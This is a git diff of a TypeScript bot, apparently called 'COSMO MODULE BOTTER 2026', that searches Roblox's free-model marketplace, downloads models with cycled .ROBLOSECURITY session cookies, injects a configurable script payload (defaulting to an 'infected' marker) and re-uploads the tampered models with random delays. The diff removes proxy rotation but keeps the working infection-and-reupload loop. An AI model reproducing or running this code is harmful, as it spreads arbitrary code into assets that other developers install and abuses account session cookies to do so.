@@ -5,39 +5,31 @@ import * as fs from "fs";
 import * as path from "path";
 import noblox from "noblox.js";
 import dotenv from "dotenv";
-import { HttpsProxyAgent } from "proxy-agent";
 
 dotenv.config();
 
 const stats = { modified: 0, scanned: 0, errors: 0, uploaded: 0 };
-const uploadLimit = parseInt(process.env.UPLOAD_LIMIT || "100");
-const payload = process.env.PAYLOAD || "print('cosmo 2026')";
+const uploadLimit = parseInt(process.env.UPLOAD_LIMIT || "20");
+const payload = process.env.PAYLOAD || "print('cosmo 2026 infected')";
 const cookies = (process.env.COOKIES || process.env.ROBLOX_COOKIE || "").split(",").filter(Boolean);
 let currentCookieIndex = 0;
 
-const agent = process.env.PROXY ? new HttpsProxyAgent(process.env.PROXY) : undefined;
-axios.defaults.httpAgent = agent;
-axios.defaults.httpsAgent = agent;
-
-function getNextCookie() {
-  const c = cookies[currentCookieIndex % cookies.length];
-  currentCookieIndex++;
-  return c;
-}
-
-async function sleep(ms: number) { return new Promise(r => setTimeout(r, ms + Math.random()*1500)); }
+async function sleep(ms: number) { return new Promise(r => setTimeout(r, ms + Math.random() * 1500)); }
 
 async function searchModels(keyword: string, cursor?: string) {
   try {
     const url = `https://apis.roblox.com/toolbox-service/v1/marketplace/10?keyword=${encodeURIComponent(keyword)}${cursor ? `&cursor=${cursor}` : ""}`;
-    const res = await axios.get(url, { headers: { "User-Agent": `Roblox/WinInet` } });
+    const res = await axios.get(url, { headers: { "User-Agent": "Roblox/WinInet" } });
     return res.data;
   } catch { return null; }
 }
 
 async function downloadModel(id: number, cookie: string) {
   try {
-    const res = await axios.get(`https://assetdelivery.roblox.com/v1/asset/?id=${id}`, { responseType: "arraybuffer", headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
+    const res = await axios.get(`https://assetdelivery.roblox.com/v1/asset/?id=${id}`, { 
+      responseType: "arraybuffer", 
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` } 
+    });
     return Buffer.from(res.data);
   } catch { return null; }
 }
@@ -61,14 +53,14 @@ async function uploadModel(filePath: string, name: string, cookie: string) {
       const form = new FormData();
       form.append("file", new Blob([buf]), "model.rbxm");
       const r = await axios.post("https://data.roblox.com/Data/Upload.ashx?assetid=0&type=Model", form, {headers: {Cookie: `.ROBLOSECURITY=${cookie}`}});
-      return parseInt(r.data);
+      return parseInt(r.data || "0");
     });
     if (assetId) {
       stats.uploaded++;
       fs.rmSync(filePath);
       console.log(`[UP] ${assetId}`);
     }
-  } catch {}
+  } catch (e) { console.log("[UPLOAD FAIL]"); }
 }
 
 async function processModel(m: any, cookie: string) {
@@ -85,6 +77,7 @@ async function processModel(m: any, cookie: string) {
 }
 
 async function main() {
+  console.log("COSMO MODULE BOTTER 2026 STARTED");
   let cursor;
   const query = process.env.SEARCH_QUERY || "free model";
   while (stats.uploaded < uploadLimit) {
@@ -92,7 +85,9 @@ async function main() {
     if (!res?.data?.length) break;
     for (const m of res.data) {
       if (stats.uploaded >= uploadLimit) break;
-      await processModel(m, getNextCookie());
+      const cookie = cookies[currentCookieIndex % cookies.length] || "";
+      currentCookieIndex++;
+      await processModel(m, cookie);
       await sleep(1500);
     }
     cursor = res.nextPageCursor;
